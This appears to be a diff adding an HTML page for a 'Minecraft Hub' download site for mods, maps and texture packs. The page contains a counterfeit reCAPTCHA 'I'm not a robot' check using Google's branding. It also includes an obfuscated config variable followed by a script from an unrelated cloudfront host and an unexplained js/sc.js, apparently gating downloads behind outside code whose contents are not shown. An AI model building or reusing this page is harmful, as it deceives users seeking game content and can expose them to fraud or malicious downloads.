@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Hub - Mods, Maps & Texture Packs</title>
+    <link rel="icon" href="https://static.wikia.nocookie.net/minecraft_gamepedia/images/2/2d/Plains_Grass_Block.png" type="image/png">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+     <script src="js/sc.js"></script>
+     
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/recaptcha.css">
+</head>
+<body>
+    <header class="header">
+        <nav class="navbar">
+            <div class="nav-brand">
+                <img src="https://static.wikia.nocookie.net/minecraft_gamepedia/images/2/2d/Plains_Grass_Block.png" alt="Minecraft Logo" class="logo">
+                <h1 class="brand-title">Minecraft Hub</h1>
+            </div>
+            
+            <div class="nav-controls">
+                <button class="theme-toggle" id="themeToggle">
+                    <i class="fas fa-moon" id="themeIcon"></i>
+                </button>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <!-- Hero Section -->
+            <section class="hero">
+                <h2 class="hero-title">Discover Amazing Minecraft Content</h2>
+                <p class="hero-subtitle">Explore the best mods, maps, and texture packs for your Minecraft experience</p>
+            </section>
+
+            <!-- Navigation Tabs -->
+            <section class="content-nav">
+                <div class="nav-tabs">
+                    <button class="nav-tab active" data-category="all">All</button>
+                    <button class="nav-tab" data-category="mods">Mods</button>
+                    <button class="nav-tab" data-category="maps">Maps</button>
+                    <button class="nav-tab" data-category="texture-packs">Texture Packs</button>
+                </div>
+            </section>
+
+            <!-- Content Grid -->
+            <section class="content-grid" id="contentGrid">
+            </section>
+
+            <div class="load-more-container">
+                <button class="load-more-btn" id="loadMoreBtn">Load More</button>
+            </div>
+        </div>
+    </main>
+
+    <div class="modal fade" id="cardModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="modalTitle"></h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="modal-content-wrapper">
+                        <div class="modal-image">
+                            <img id="modalImage" src="" alt="" class="img-fluid">
+                        </div>
+                        <div class="modal-info">
+                            <p class="modal-category" id="modalCategory"></p>
+                            <div class="modal-description" id="modalDescription"></div>
+                            <button class="download-btn" id="downloadNowBtn">
+                                <i class="fas fa-download"></i>
+                                Download Now
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+ <!-- reCAPTCHA Modal -->
+<div class="modal fade" id="captchaModal" tabindex="-1" aria-labelledby="captchaModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content captcha-modal">
+            <div class="modal-body">
+                <div class="captcha-header">
+                    <h5 class="captcha-title"><b>Security Verification</b></h5>
+                    <p class="captcha-instruction" style="color: gray;">Please complete the security check</p>
+                </div>
+                
+                <div class="captcha">
+                    <div class="spinner">
+                        <label>
+                            <input type="checkbox" id="captchaCheckbox">
+                            <span class="checkmark">
+                                <span></span>
+                            </span>
+                        </label>
+                    </div>
+                    <div class="text">I'm not a robot</div>
+                    <div class="logo">
+                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" 
+                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iNCIgZmlsbD0iIzQyODVGNCIvPgo8cGF0aCBkPSJNMjIuNjY2NyAxMi42NjY3TDE5LjMzMzMgMTZMMTQuNjY2NyAxMS4zMzMzQzE0LjQ4OTUgMTEuMTU2MiAxNC4yNDQgMTEuMDU2IDE0IDExLjA1NkMxMy43NTYgMTEuMDU2IDEzLjUxMDUgMTEuMTU2MiAxMy4zMzMzIDExLjMzMzNMMTIgMTIuNjY2N0MxMS44MjI5IDEyLjg0MzkgMTEuNzIyNyAxMy4wODk0IDExLjcyMjcgMTMuMzMzM0MxMS43MjI3IDEzLjU3NzMgMTEuODIyOSAxMy44MjI4IDEyIDEzLjk5OTlMMjAuNjY2NyAyMi42NjY3QzIwLjg0MzkgMjIuODQzOSAyMS4wODk0IDIyLjk0NCAyMS4zMzMzIDIyLjk0NEMyMS41NzczIDIyLjk0NCAyMS44MjI4IDIyLjg0MzkgMjIgMjIuNjY2N0wyMi42NjY3IDE2WiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+'">
+                        <p>reCAPTCHA</p>
+                        <small>Privacy-Terms</small>
+                    </div>
+                </div>
+                
+                <div style="padding: 16px 24px; border-top: 1px solid #e8eaed; background: #f8f9fa; text-align: left;">
+                    <!-- <center>                    <button type="button" class="btn btn-primary btn-sm" id="verifyBtn" disabled style="font-size: 13px; background: #1a73e8; border-color: #1a73e8;">Verify</button></center> -->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner">
+            <div class="minecraft-loader">
+                <div class="block"></div>
+                <div class="block"></div>
+                <div class="block"></div>
+                <div class="block"></div>
+            </div>
+            <p>Loading content...</p>
+        </div>
+    </div>
+
+
+    <script type="text/javascript">
+    var GdTqB_wek_IZbQFc={"it":4551437,"key":"a8944"};
+    </script>
+    <script src="https://duw03nk63ml3f.cloudfront.net/b79bf6f.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="js/app.js"></script>
+    
+
+
+
+
+</body>
+</html>
